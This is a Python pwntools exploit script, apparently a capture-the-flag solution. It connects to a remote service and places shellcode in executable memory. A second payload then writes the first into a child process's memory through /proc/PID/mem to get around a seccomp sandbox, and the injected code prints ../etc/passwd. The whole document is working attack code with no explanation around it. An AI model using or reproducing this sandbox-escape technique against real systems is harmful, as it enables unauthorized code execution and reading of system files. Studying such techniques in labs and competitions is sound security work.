```python
#!/usr/bin/env python3
from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'info'

p = remote('IP', 9999)
p.sendlineafter(b':', b'2')
p.recvuntil(b'PID = ')
child_pid = int(p.recvline().strip())

# Inner: cat file in child (no seccomp)
inner_sc = asm(shellcraft.cat('../etc/passwd') + '\njmp $')

p.sendlineafter(b':', b'1')
p.sendlineafter(b'?', str(len(inner_sc) + 1000).encode())
p.sendlineafter(b'?', b'7')
p.sendafter(b'?', inner_sc + b'\n')
p.recvuntil(b'at ')
inner_addr = int(p.recvline().strip(), 16)

# Outer: inject inner into child
outer_sc = asm(
    f'mov r15, {inner_addr}\n' +
    shellcraft.open(f'/proc/{child_pid}/mem', 2) + '\n' +
    'mov r14, rax\n' +  # Save fd
    shellcraft.lseek('r14', 0x401830, 0) + '\n' +
    shellcraft.write('r14', 'r15', len(inner_sc)) + '\njmp $'
)

p.sendlineafter(b':', b'1')
p.sendlineafter(b'?', str(len(outer_sc) + 1000).encode())
p.sendlineafter(b'?', b'7')
p.sendafter(b'?', outer_sc + b'\n')
p.recvuntil(b'at ')
outer_addr = int(p.recvline().strip(), 16)

p.sendlineafter(b':', b'3')
p.sendlineafter(b'?', hex(outer_addr).encode())

output = b''
for i in range(15):
    time.sleep(1)
    try:
        d = p.recv(timeout=0.5)
        if d:
            output += d
    except: pass

if output:
    print(output.decode(errors='ignore'))

p.close()
```
